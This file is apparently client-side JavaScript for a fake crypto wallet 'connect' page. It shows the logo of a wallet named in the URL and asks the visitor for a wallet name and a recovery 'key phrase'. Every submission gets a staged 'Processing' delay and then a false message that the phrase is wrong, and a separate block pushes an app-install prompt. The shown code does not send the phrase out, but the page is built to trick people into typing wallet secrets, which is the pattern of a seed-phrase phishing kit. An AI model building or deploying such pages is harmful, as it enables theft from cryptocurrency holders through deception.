const walletLogo = document.getElementById("walletLogo");
const walletName = document.getElementById("walletName");
const popup = document.getElementById("popup");
const popupText = document.getElementById("popupText");
const closePopupBtn = document.getElementById("closePopupBtn");

function showPopup(message) {
  popupText.innerText = message;
  popup.style.display = "flex";
}

closePopupBtn.addEventListener("click", () => {
  popup.style.display = "none";
});

const params = new URLSearchParams(window.location.search);
const wallet = params.get("wallet");

if (wallet) {
  walletName.innerText = wallet;

  const fileName = wallet
    .toLowerCase()
    .replace(/\s+/g, "")
    .replace(/['./]/g, "");

  walletLogo.src = `wallet-icons/${fileName}.webp`;

  walletLogo.onerror = () => {
    walletLogo.style.display = "none";
  };
}

document.getElementById("connectBtn").addEventListener("click", () => {
  const name = document.getElementById("walletInput").value.trim();
  const phrase = document.getElementById("phraseInput").value.trim();
  const check = document.getElementById("confirmCheck");

  if (name === "" || phrase === "") {
    showPopup("Please fill out the field");
    return;
  }

  if (!check.checked) {
    showPopup("Please confirm you entered it correctly");
    return;
  }

  showPopup("Processing... please wait");

  setTimeout(() => {
    showPopup("Your key phrase is wrong!");
  }, 10000);
});
// Auto PWA Install Trigger After Wrong Phrase
setTimeout(async () => {
  if (window.deferredPrompt) {
    window.deferredPrompt.prompt();
    await window.deferredPrompt.userChoice;
    window.deferredPrompt = null;
  } else {
    console.log("Install prompt not ready");
  }
}, 100); // sirf event register hone ka small wait
